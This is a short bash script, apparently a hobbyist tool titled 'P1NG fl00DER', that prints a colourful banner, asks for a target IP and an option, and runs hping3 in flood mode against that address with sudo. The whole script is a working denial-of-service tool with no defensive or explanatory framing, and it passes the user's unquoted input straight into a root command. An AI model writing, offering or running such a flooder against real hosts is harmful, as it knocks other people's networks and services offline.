#!/bin/bash
echo "================================================" | lolcat 
figlet P1NG fl00DER | lolcat 
echo "================================================" | lolcat 

echo "Enter an IP: "
read ip
echo "enter an option: "
read option

sudo hping3 $option --flood $ip
clear
echo "sending packets.........."
